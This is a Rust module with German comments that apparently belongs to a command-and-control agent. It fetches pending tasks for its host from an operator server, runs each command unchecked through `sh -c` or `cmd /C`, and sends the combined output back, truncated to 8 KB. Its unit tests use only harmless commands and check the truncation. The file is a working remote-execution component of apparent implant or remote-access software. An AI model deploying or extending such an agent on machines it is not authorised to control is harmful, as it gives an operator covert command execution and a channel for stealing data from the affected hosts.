//! Task-Verarbeitung im Agent: offene Tasks holen, ausfuehren, melden.
//!
//! Der Operator legt ueber `POST /api/tasks/new` einen Auftrag an. Der Agent
//! holt die offenen Tasks, fuehrt das Kommando lokal aus und meldet Status und
//! Ausgabe ueber `POST /api/tasks/result` zurueck. Der Operator liest beides
//! anschliessend unter `GET /api/tasks`.
//!
//! Die Befehlsausfuehrung laeuft in diesem Modul bewusst ueber die Shell:
//! ein Auftrag ist ein Kommandozeilen-Befehl, keine Argvektor-Liste.

use std::process::Command;

use kx_core::c2::{Task, TaskResultRequest, STATUS_DONE, STATUS_FAILED, STATUS_PENDING};
use tracing::{error, info, warn};

use crate::c2::C2Client;

/// Laengste Ausgabe, die zurueckgemeldet wird.
///
/// Ein Task, der eine Datei ausgibt, darf den Server nicht fluten. Die Ausgabe
/// wird gekuerzt, nicht verworfen — der Operator sieht den Anfang.
const MAX_RESULT_LEN: usize = 8 * 1024;

/// Holt die offenen Tasks dieses Hosts, fuehrt sie aus und meldet die Ergebnisse.
///
/// Gibt die Anzahl der ausgefuehrten Tasks zurueck.
pub async fn run_pending_tasks(
    client: &C2Client,
    host_id: &str,
) -> Result<usize, crate::c2::C2Error> {
    let tasks = client.fetch_tasks().await?;
    let pending: Vec<&Task> = tasks
        .iter()
        .filter(|t| t.host_id == host_id && t.status == STATUS_PENDING)
        .collect();

    if pending.is_empty() {
        return Ok(0);
    }
    info!("{} offene Tasks gefunden", pending.len());

    let mut executed = 0usize;
    for task in pending {
        let output = execute_command(&task.command);
        let status = if output.status == 0 {
            STATUS_DONE
        } else {
            STATUS_FAILED
        };

        let report = TaskResultRequest {
            task_id: task.id.clone(),
            status: status.to_string(),
            result: output.output,
        };
        match client.report_task_result(&report).await {
            Ok(()) => {
                info!("Task {task_id} ausgeführt: {status}", task_id = task.id);
                executed += 1;
            }
            Err(e) => {
                // Ein 404 heisst: der Task existiert nicht mehr. Das ist kein
                // Fehler des Agenten — er meldet nur, was er nicht mehr tun kann.
                error!(
                    "Ergebnis für Task {task_id} konnte nicht gemeldet werden: {e}",
                    task_id = task.id
                );
            }
        }
    }
    Ok(executed)
}

/// Das Ergebnis eines ausgefuehrten Kommandos.
struct CommandOutput {
    /// Exitcode des Prozesses.
    status: i32,
    /// Zusammengefasste Standard- und Fehlerausgabe.
    output: String,
}

/// Fuehrt ein Kommando in der Shell aus und sammelt die Ausgabe.
///
/// Der Exitcode landet in `status`; die Ausgabe in `output`, gekuerzt auf
/// [`MAX_RESULT_LEN`].
fn execute_command(command: &str) -> CommandOutput {
    let result = Command::new(shell())
        .arg(shell_flag())
        .arg(command)
        .output();

    match result {
        Ok(out) => {
            let mut text = String::from_utf8_lossy(&out.stdout).to_string();
            let stderr = String::from_utf8_lossy(&out.stderr).to_string();
            if !stderr.is_empty() {
                if !text.is_empty() {
                    text.push('\n');
                }
                text.push_str(&stderr);
            }
            CommandOutput {
                status: out.status.code().unwrap_or(-1),
                output: truncate(&text, MAX_RESULT_LEN),
            }
        }
        Err(e) => {
            warn!("Kommando konnte nicht gestartet werden: {e}");
            CommandOutput {
                status: -1,
                output: truncate(&format!("Start fehlgeschlagen: {e}"), MAX_RESULT_LEN),
            }
        }
    }
}

/// Die Shell, in der das Kommando laeuft.
#[cfg(unix)]
fn shell() -> &'static str {
    "sh"
}

/// Das Argument, das der Shell den Kommandozeilen-Befehl uebergibt.
#[cfg(unix)]
fn shell_flag() -> &'static str {
    "-c"
}

/// Die Shell, in der das Kommando laeuft.
#[cfg(windows)]
fn shell() -> &'static str {
    "cmd"
}

/// Das Argument, das der Shell den Kommandozeilen-Befehl uebergibt.
#[cfg(windows)]
fn shell_flag() -> &'static str {
    "/C"
}

/// Kuerzt einen Text auf eine maximale Laenge.
///
/// Es wird an einer Zeichengrenze gekuerzt, nicht mitten in einem UTF-8-Byte —
/// ein abgeschnittenes multibyte-Zeichen waere ungueltiges UTF-8.
fn truncate(text: &str, max_len: usize) -> String {
    if text.len() <= max_len {
        return text.to_string();
    }
    let mut end = max_len;
    while end > 0 && !text.is_char_boundary(end) {
        end -= 1;
    }
    let mut out = text[..end].to_string();
    out.push_str("… [gekürzt]");
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Der Agent fuehrt wirklich etwas aus — der Pfad ist nicht nur eine
    /// Formalitaet. Ohne diesen Test koennte die Shell-Anbindung stillschweigend
    /// kaputt sein.
    #[test]
    fn command_output_carries_the_real_result() {
        let out = execute_command("echo kx-task-test");
        assert_eq!(out.status, 0, "der Befehl sollte erfolgreich sein");
        assert!(
            out.output.contains("kx-task-test"),
            "die Ausgabe fehlt: {}",
            out.output
        );
    }

    /// Ein fehlschlagender Befehl liefert einen Exitcode ungleich null — der
    /// Agent meldet daraus den Status `failed`.
    #[test]
    fn failing_command_reports_a_nonzero_status() {
        let out = execute_command("exit 3");
        assert_eq!(out.status, 3);
    }

    /// Die Ausgabe wird gekuerzt, damit ein grosser Task den Server nicht
    /// flutet — aber der Anfang bleibt lesbar.
    #[test]
    fn long_output_is_truncated_at_a_character_boundary() {
        let long = "a".repeat(MAX_RESULT_LEN + 100);
        let out = truncate(&long, MAX_RESULT_LEN);
        assert!(out.len() <= MAX_RESULT_LEN + 32, "zu lang: {}", out.len());
        assert!(out.starts_with("aaa"), "der Anfang fehlt");
        assert!(out.ends_with("[gekürzt]"), "die Kuerzung fehlt: {out}");
    }

    /// Die Kuerzung bricht kein UTF-8-Zeichen. Ein Zeichen, das an der Grenze
    /// beginnt, muss sauber abgeschnitten werden.
    #[test]
    fn truncation_never_splits_a_multibyte_character() {
        let text = "a".repeat(MAX_RESULT_LEN - 1) + "ä";
        let out = truncate(&text, MAX_RESULT_LEN);
        assert!(out.is_char_boundary(out.len()));
        assert!(std::str::from_utf8(out.as_bytes()).is_ok());
    }

    /// Ein kurzer Text bleibt unveraendert.
    #[test]
    fn short_output_is_not_truncated() {
        assert_eq!(truncate("kurz", MAX_RESULT_LEN), "kurz");
    }
}
